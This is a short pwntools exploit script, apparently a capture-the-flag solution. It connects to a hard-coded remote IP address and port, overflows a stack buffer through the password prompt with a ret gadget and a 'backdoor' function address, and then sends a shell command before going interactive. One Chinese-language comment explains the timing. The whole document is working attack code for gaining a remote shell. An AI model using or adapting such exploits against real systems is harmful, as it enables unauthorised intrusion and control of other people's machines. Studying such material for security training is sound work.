from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "120.27.146.76"
PORT = 27861

ret = 0x401374
backdoor = 0x4011f6
payload = b"A" * 0x88 + p64(ret) + p64(backdoor)

io = remote(HOST, PORT)
io.recvuntil(b"Username: ")
io.sendline(b"user")
io.recvuntil(b"Password: ")
io.sendline(payload)

# 等 shell 起好后再发命令，避免输入被前面的 stdio 处理掉
sleep(0.3)
io.sendline(b"base64")

io.interactive()